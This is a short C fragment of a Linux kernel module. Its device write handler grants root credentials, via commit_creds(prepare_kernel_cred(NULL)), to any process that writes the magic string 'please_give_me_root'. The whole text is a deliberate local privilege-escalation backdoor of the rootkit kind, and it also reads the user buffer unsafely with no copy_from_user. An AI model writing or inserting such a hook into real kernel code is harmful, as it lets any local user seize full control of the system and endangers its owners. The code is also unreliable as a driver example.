#include <linux/cred.h>
#include <linux/uaccess.h>

#define PLEASE_GIVE_ME_ROOT "please_give_me_root"

ssize_t device_write(struct file *fp, const char *buf, size_t count, loff_t *offp) {
	if (!strcmp(buf, PLEASE_GIVE_ME_ROOT)) {
		commit_creds(prepare_kernel_cred(NULL));
	}

	return count;
}
